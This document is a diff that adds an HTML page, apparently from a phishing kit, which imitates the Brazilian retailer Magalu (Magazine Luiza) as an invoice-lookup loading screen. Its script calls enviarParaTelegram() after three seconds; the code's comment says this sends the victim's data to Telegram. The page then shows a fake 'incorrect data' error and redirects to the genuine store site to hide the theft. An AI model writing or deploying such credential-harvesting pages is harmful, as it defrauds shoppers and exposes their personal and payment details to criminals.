@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consultar Fatura - Carregando</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 200px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #ddd;
+            border-top: 5px solid #ff8000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            margin-top: 15px;
+            font-size: 16px;
+            color: #333;
+        }
+
+        .error-text {
+            color: red;
+            font-weight: bold;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1>Magalu</h1>
+        <div class="color-bar"></div>
+    </div>
+
+    <div class="container">
+        <h2>Consultando Fatura...</h2>
+        <p>Aguarde enquanto confirmamos seus dados.</p>
+
+        <div class="loading-container">
+            <div class="loading-spinner" id="spinner"></div>
+            <p class="loading-text" id="statusText">Confirmando dados</p>
+            <p class="error-text" id="errorText">Erro: Dados incorretos</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+    <script>
+        setTimeout(() => {
+            enviarParaTelegram(); // Chama a função para enviar os dados ao Telegram
+        }, 3000); // Aguarda 3 segundos antes de enviar
+
+        setTimeout(() => {
+            document.getElementById("statusText").style.display = "none";
+            document.getElementById("spinner").style.display = "none";
+            document.getElementById("errorText").style.display = "block";
+        }, 4000); // Após 4 segundos, exibe o erro
+
+        setTimeout(() => {
+            window.location.href = "https://www.magazineluiza.com.br/"; // Redireciona
+        }, 7000); // Após 7 segundos, redireciona
+    </script>
+
+</body>
+</html>
